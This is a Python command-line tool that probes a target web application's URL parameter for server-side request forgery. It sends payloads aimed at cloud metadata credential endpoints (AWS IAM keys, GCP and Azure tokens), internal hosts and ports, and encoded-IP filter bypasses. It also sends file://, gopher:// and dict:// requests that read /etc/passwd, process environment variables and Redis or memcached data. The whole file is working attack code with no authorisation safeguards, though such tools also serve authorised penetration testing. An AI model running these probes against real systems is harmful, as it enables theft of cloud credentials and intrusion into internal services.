#!/usr/bin/env python3
"""SSRF Auto-Detector -- tests URL params against internal hosts, metadata, bypasses, protocols.
Usage: python3 ssrf_detector.py --url TARGET_URL --param url [--all] [-o results.json]
"""
import argparse, json, subprocess, sys, time, urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

CLOUD_METADATA = {
    "aws": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
        "http://169.254.169.254/latest/user-data/",
    ],
    "gcp": [
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
    ],
    "azure": [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    ],
    "digitalocean": [
        "http://169.254.169.254/metadata/v1.json",
    ],
    "alicloud": [
        "http://100.100.100.200/latest/meta-data/",
    ],
    "oracle": [
        "http://169.254.169.254/opc/v2/instance/",
    ],
    "openstack": [
        "http://169.254.169.254/openstack/latest/meta_data.json",
    ],
}

INTERNAL_HOSTS = ["127.0.0.1", "localhost", "0.0.0.0", "[::1]", "10.0.0.1", "172.16.0.1", "192.168.0.1"]
INTERNAL_PORTS = [22, 80, 443, 3000, 3306, 5000, 5432, 6379, 8000, 8080, 8443, 9200, 11211, 27017]

IP_BYPASSES = [
    ("decimal_loopback", "http://2130706433:80/"),
    ("hex_dword", "http://0x7f000001:80/"),
    ("octal_dotted", "http://0177.0.0.1:80/"),
    ("hex_dotted", "http://0x7f.0x0.0x0.0x1:80/"),
    ("nipio", "http://127.0.0.1.nip.io/"),
    ("localtestme", "http://localtest.me/"),
    ("ipv6_mapped", "http://[::ffff:127.0.0.1]:80/"),
    ("metadata_dec", "http://2852039166/latest/meta-data/"),
    ("metadata_hex", "http://0xa9fea9fe/latest/meta-data/"),
    ("metadata_oct", "http://0251.0376.0251.0376/latest/meta-data/"),
]

PROTOCOL_PAYLOADS = [
    ("file_passwd", "file:///etc/passwd"),
    ("file_environ", "file:///proc/self/environ"),
    ("gopher_redis", "gopher://127.0.0.1:6379/_INFO%0D%0AQUIT%0D%0A"),
    ("dict_redis", "dict://127.0.0.1:6379/info"),
    ("dict_memcached", "dict://127.0.0.1:11211/stats"),
]

RESPONSE_SIGS = {
    "aws_creds": ['"AccessKeyId"', '"SecretAccessKey"', '"Token"'],
    "aws_instance": ['"availabilityZone"', '"region"'],
    "gcp_token": ['"access_token"', '"expires_in"'],
    "passwd": ["root:x:0:0:"],
    "redis": ["redis_version", "connected_clients"],
    "es": ['"cluster_name"', '"number_of_nodes"'],
    "docker": ['"Id"', '"Names"', '"Image"'],
    "memcached": ["STAT pid", "STAT version"],
}


def exec_curl(url, param, payload, extra_headers=None):
    encoded = urllib.parse.quote(payload, safe="")
    target = f"{url}?{param}={encoded}"
    cmd = ["curl", "-s", "-w", "\\nHTTP:%{http_code}|SZ:%{size_download}|TM:%{time_total}", "-o", "/dev/null"]
    if extra_headers:
        for h in extra_headers:
            cmd.extend(["-H", h])
    cmd.append(target)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        parts = r.stdout.rsplit("|", 2)
        code = int(parts[0].split(":")[1]) if len(parts) > 0 and "HTTP:" in parts[0] else 0
        sz = int(parts[1].split(":")[1]) if len(parts) > 1 and "SZ:" in parts[1] else 0
        tm = float(parts[2].split(":")[1]) if len(parts) > 2 and "TM:" in parts[2] else 0.0
        return {"http_code": code, "size": sz, "elapsed": tm}
    except Exception as e:
        return {"error": str(e), "http_code": 0, "size": 0, "elapsed": 0}


def probe(url, param, payload):
    r = exec_curl(url, param, payload)
    r["payload"] = payload
    return r


def test_internal(url, param):
    findings = []
    for host in INTERNAL_HOSTS:
        for port in INTERNAL_PORTS[:6]:
            p = f"http://{host}:{port}/"
            r = probe(url, param, p)
            findings.append(r)
            time.sleep(0.15)
    return findings


def test_metadata(url, param):
    findings = []
    for provider, payloads in CLOUD_METADATA.items():
        for p in payloads:
            r = probe(url, param, p)
            if r["http_code"] == 200 and r["size"] > 50:
                r["finding"] = "CRITICAL"
            findings.append(r)
            time.sleep(0.3)
    return findings


def test_bypasses(url, param):
    findings = []
    for name, p in IP_BYPASSES:
        r = probe(url, param, p)
        r["bypass"] = name
        findings.append(r)
        time.sleep(0.2)
    return findings


def test_protocols(url, param):
    findings = []
    for name, p in PROTOCOL_PAYLOADS:
        r = probe(url, param, p)
        r["protocol"] = name
        findings.append(r)
        time.sleep(0.2)
    return findings


def main():
    ap = argparse.ArgumentParser(description="SSRF Auto-Detector")
    ap.add_argument("--url", required=True)
    ap.add_argument("--param", required=True)
    ap.add_argument("--internal", action="store_true")
    ap.add_argument("--metadata", action="store_true")
    ap.add_argument("--bypass", action="store_true")
    ap.add_argument("--protocols", action="store_true")
    ap.add_argument("--all", action="store_true")
    ap.add_argument("-o", "--output", default="ssrf_results.json")
    args = ap.parse_args()

    do_all = args.all or not any([args.internal, args.metadata, args.bypass, args.protocols])
    results = {"target": args.url, "param": args.param, "sections": {}}
    all_f = []

    if do_all or args.internal:
        results["sections"]["internal"] = test_internal(args.url, args.param)
        all_f.extend(results["sections"]["internal"])
    if do_all or args.metadata:
        results["sections"]["cloud_metadata"] = test_metadata(args.url, args.param)
        all_f.extend(results["sections"]["cloud_metadata"])
    if do_all or args.bypass:
        results["sections"]["ip_bypasses"] = test_bypasses(args.url, args.param)
        all_f.extend(results["sections"]["ip_bypasses"])
    if do_all or args.protocols:
        results["sections"]["protocols"] = test_protocols(args.url, args.param)
        all_f.extend(results["sections"]["protocols"])

    critical = [f for f in all_f if f.get("http_code") == 200 and f.get("size", 0) > 100]
    results["summary"] = {"total": len(all_f), "critical": len(critical)}

    with open(args.output, "w") as fout:
        json.dump(results, fout, indent=2)

    print(f"[DONE] {len(all_f)} probes ({len(critical)} critical) -> {args.output}")


if __name__ == "__main__":
    main()
